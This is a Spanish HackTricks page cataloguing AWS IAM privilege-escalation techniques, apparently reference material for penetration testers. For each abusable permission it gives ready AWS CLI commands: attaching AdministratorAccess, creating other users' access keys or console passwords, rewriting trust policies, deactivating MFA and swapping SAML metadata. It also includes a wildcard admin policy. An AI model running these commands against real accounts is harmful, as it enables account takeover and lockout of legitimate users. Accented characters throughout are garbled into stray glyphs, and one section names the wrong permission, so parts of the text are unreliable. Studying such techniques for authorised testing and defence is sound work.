# AWS - IAM Privesc

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## IAM

Para m치s informaci칩n sobre IAM, consulta:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

Un atacante con el permiso **`iam:CreatePolicyVersion`** puede crear **una nueva versi칩n de una pol칤tica de IAM a la que tenga acceso**. Esto les permite definir sus **propios permisos personalizados**. Al crear una nueva versi칩n de pol칤tica, es necesario **establecerla como la versi칩n predeterminada para que tenga efecto**, lo que uno pensar칤a que requerir칤a el permiso `iam:SetDefaultPolicyVersion`, pero al crear una nueva versi칩n de pol칤tica, es posible incluir una bandera (**`--set-as-default`**) que autom치ticamente la crear치 como la **nueva versi칩n predeterminada**. Esa bandera **no** **requiere** el permiso `iam:SetDefaultPolicyVersion` para su uso.

Un ejemplo de comando para explotar este m칠todo podr칤a ser:
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
Donde el archivo `policy.json` incluir칤a un **documento de pol칤tica que permite cualquier acci칩n contra cualquier recurso en la cuenta**.

**Impacto Potencial:** Escalada de privilegios directa a todo.

### `iam:SetDefaultPolicyVersion`

Un atacante con el permiso **`iam:SetDefaultPolicyVersion`** podr칤a ser capaz de escalar privilegios a trav칠s de **versiones de pol칤ticas existentes que actualmente no est치n en uso**. Si una **pol칤tica a la que tienen acceso** tiene versiones que **no son la predeterminada**, podr칤an cambiar la versi칩n predeterminada a cualquier otra versi칩n existente.

{% hint style="warning" %}
Si la **pol칤tica** que est치s **modificando** la versi칩n es la misma que est치 **otorgando** al atacante el permiso `SetDefaultPolicyVersion`, y la **nueva versi칩n no otorga** ese permiso, el atacante **no podr치 devolver la pol칤tica a su estado original**.
{% endhint %}

Un ejemplo de comando para explotar este m칠todo podr칤a verse as칤:
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
Donde "v2" es la versi칩n de la pol칤tica con m치s privilegios disponibles.

**Impacto Potencial:** Privesc indirecto estableciendo una versi칩n de pol칤tica diferente que podr칤a otorgar m치s permisos.

### `iam:CreateAccessKey`

Un atacante con el permiso **`iam:CreateAccessKey`** sobre otros usuarios puede **crear un ID de clave de acceso y una clave de acceso secreta pertenecientes a otro usuario** en el entorno de AWS, si no tienen ya dos conjuntos asociados con ellos (lo cual las mejores pr치cticas indican que no deber칤an).

Un ejemplo de comando para explotar este m칠todo podr칤a ser el siguiente:
```bash
aws iam create-access-key --user-name <target_user>
```
Donde target_user tiene un conjunto de permisos m치s amplio en comparaci칩n con el usuario actual.

**Impacto Potencial:** Privesc directo a cualquier usuario.

### `iam:CreateLoginProfile`

Un atacante con el permiso `iam:CreateLoginProfile` en otros usuarios puede **crear una contrase침a** para usar e **iniciar sesi칩n** en la consola de AWS en **cualquier usuario que no tenga ya configurado un perfil de inicio de sesi칩n**.

Un ejemplo de comando para explotar este m칠todo podr칤a ser as칤:
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
Esa contrase침a garantiza que cumplir치 con los **requisitos m칤nimos de contrase침a de la cuenta**.

**Impacto Potencial:** Privesc directo a "cualquier" usuario.

### `iam:UpdateLoginProfile`

Un atacante con el permiso **`iam:UpdateLoginProfile`** en otros usuarios puede **cambiar la contrase침a utilizada para iniciar sesi칩n en la consola de AWS** en cualquier usuario que **ya tenga configurado un perfil de inicio de sesi칩n**.

Al igual que al crear un perfil de inicio de sesi칩n, un ejemplo de comando para explotar este m칠todo podr칤a ser el siguiente:
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
Esa contrase침a garantiza que cumplir치 con los **requisitos m칤nimos de contrase침a de la cuenta**.

**Impacto Potencial:** Privesc directo de "cualquier" usuario.

### `iam:UpdateAccessKey`

Un atacante con **`iam:UpdateAccessKey`** podr칤a **habilitar una clave de acceso deshabilitada** y usarla (necesitar칤a tener la clave de acceso deshabilitada)

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**Impacto Potencial:** Privesc directo para acceder al usuario clave (necesitando tener la clave).

### `iam:CreateServiceSpecificCredential`

Permite **generar** un **nombre de usuario** y una **contrase침a** que se pueden utilizar para **acceder al servicio especificado** en la solicitud (**CodeCommit o Amazon Keyspaces** -- Apache Cassandra--).

Las nuevas credenciales espec칤ficas del servicio tienen los **mismos permisos que el usuario asociado** excepto que solo se pueden utilizar para acceder al servicio especificado.

Solo es posible tener un **m치ximo de dos conjuntos de credenciales espec칤ficas del servicio para cada** servicio compatible por usuario.

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
{% endcode %}

**Impacto Potencial:** Privesc directo a permisos de servicio de usuario.

### `iam:ResetServiceSpecificCredential`

Similar a **`iam:CreateServiceSpecificCredential`**, pero en lugar de crear nuevas credenciales, las restablece.

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
{% endcode %}

**Impacto Potencial:** Privesc directo a permisos de servicio de usuario.

### `iam:AttachUserPolicy`

Un atacante con el permiso **`iam:AttachUserPolicy`** puede escalar privilegios **adjuntando una pol칤tica a un usuario al que tienen acceso**, a침adiendo los permisos de esa pol칤tica al atacante.

Un ejemplo de comando para explotar este m칠todo podr칤a ser el siguiente:
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**Impacto Potencial:** Privesc directo a cualquier cosa.

### `iam:AttachGroupPolicy`

Un atacante con el permiso **`iam:AttachGroupPolicy`** puede escalar privilegios **adjuntando una pol칤tica a un grupo** del cual forma parte, a침adiendo los permisos de esa pol칤tica al atacante.
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
Donde el grupo es un grupo del cual el usuario actual es miembro.

**Impacto Potencial:** Privesc directo a cualquier cosa (si el usuario est치 dentro de un grupo).

### `iam:AttachRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

Un atacante con el permiso **`iam:AttachRolePolicy`** puede escalar privilegios **adjuntando una pol칤tica a un rol** al que tienen acceso, a침adiendo los permisos de esa pol칤tica al atacante.
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
Donde el rol es un rol que el usuario actual puede asumir temporalmente con `sts:AssumeRole`.

**Impacto Potencial:** Privesc directo a cualquier cosa.

### `iam:PutUserPolicy`

Un atacante con el permiso `iam:PutUserPolicy` puede **escalar privilegios creando o actualizando una pol칤tica inline para un usuario** al que tienen acceso, a침adiendo los permisos de esa pol칤tica al atacante.
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
Puede utilizar una pol칤tica como:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**Impacto Potencial:** Privesc directo a cualquier cosa.

### `iam:PutGroupPolicy`

Un atacante con el permiso `iam:PutGroupPolicy` puede escalar privilegios **creando o actualizando una pol칤tica inline para un grupo del cual forma parte**, a침adiendo los permisos de esa pol칤tica al atacante.
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
Donde el grupo es **un grupo en el que se encuentra el usuario actual**.

**Impacto Potencial:** Privesc directo a cualquier cosa.

### `iam:PutRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

Un atacante con el permiso **`iam:PutRolePolicy`** puede escalar privilegios **creando o actualizando una pol칤tica integrada para un rol al que tienen acceso**, a침adiendo los permisos de esa pol칤tica al atacante.

Un comando de ejemplo para explotar este m칠todo podr칤a ser el siguiente:
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
Donde el rol es un rol que el usuario actual puede asumir temporalmente con `sts:AssumeRole`.

**Impacto Potencial:** Privesc directo a cualquier cosa.

### `iam:AddUserToGroup`

Un atacante con el permiso **`iam:AddUserToGroup`** puede usarlo para **agregarse a un Grupo IAM existente** en la cuenta de AWS.
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
Donde **target\_group tiene m치s/diferentes privilegios** que la cuenta de usuario del atacante.

**Impacto Potencial:** Privesc directo a cualquier grupo.

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

Un atacante con los permisos `iam:UpdateAssumeRolePolicy` y `sts:AssumeRole` podr칤a **cambiar el documento de pol칤tica de asunci칩n de rol de cualquier rol existente** para permitirles asumir ese rol.
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
Donde la pol칤tica se ve como la siguiente, que otorga al usuario permiso para asumir el rol:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Impacto Potencial:** Privesc directo a cualquier rol.

### `iam:UploadSSHPublicKey`

Un atacante con `iam:DeactivateMFADevice` puede subir una **clave p칰blica SSH y asociarla con el usuario IAM especificado**([Aprender m치s](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html)).

La clave p칰blica SSH subida por esta operaci칩n solo puede ser utilizada para **autenticar al usuario IAM asociado en un repositorio CodeCommit**. Para m치s informaci칩n sobre c칩mo usar claves SSH para autenticarse en un repositorio CodeCommit, vea [Configurar CodeCommit para conexiones SSH](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html) en la _Gu칤a del Usuario de CodeCommit_.
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**Impacto Potencial:** Privesc indirecto a CodeCommit.

### `iam:DeactivateMFADevice`

Un atacante con `iam:DeactivateMFADevice` puede **desactivar el dispositivo MFA especificado** y eliminar su asociaci칩n con el usuario IAM para el cual fue originalmente habilitado ([Aprender m치s](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_DeactivateMFADevice.html)).
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**Impacto Potencial:** Privesc indirecto de un usuario si ya conoces su nombre de usuario y contrase침a al deshabilitar el dispositivo MFA.

### `iam:ResyncMFADevice`

Un atacante con `iam:ResyncMFADevice` puede **sincronizar el dispositivo MFA especificado** con una entidad IAM: usuario o rol ([Aprender m치s](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_ResyncMFADevice.html)).
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**Impacto Potencial:** Privesc indirecto de un usuario si ya conoces su nombre de usuario y contrase침a agregando un dispositivo MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Con estos permisos puedes **cambiar los metadatos XML de la conexi칩n SAML**. Luego, podr칤as abusar de la **federaci칩n SAML** para **iniciar sesi칩n** con cualquier **rol que conf칤e** en ella.

Ten en cuenta que al hacer esto, **los usuarios leg칤timos no podr치n iniciar sesi칩n**. Sin embargo, podr칤as obtener el XML, para que puedas poner el tuyo, iniciar sesi칩n y configurar el anterior de nuevo.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: Una herramienta capaz de generar los metadatos SAML e iniciar sesi칩n con un rol especificado
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(No estoy seguro de esto) Si un atacante tiene estos **permisos**, podr칤a agregar una nueva **Huella Digital** para lograr iniciar sesi칩n en todos los roles que conf칤an en el proveedor.

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
## Referencias

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
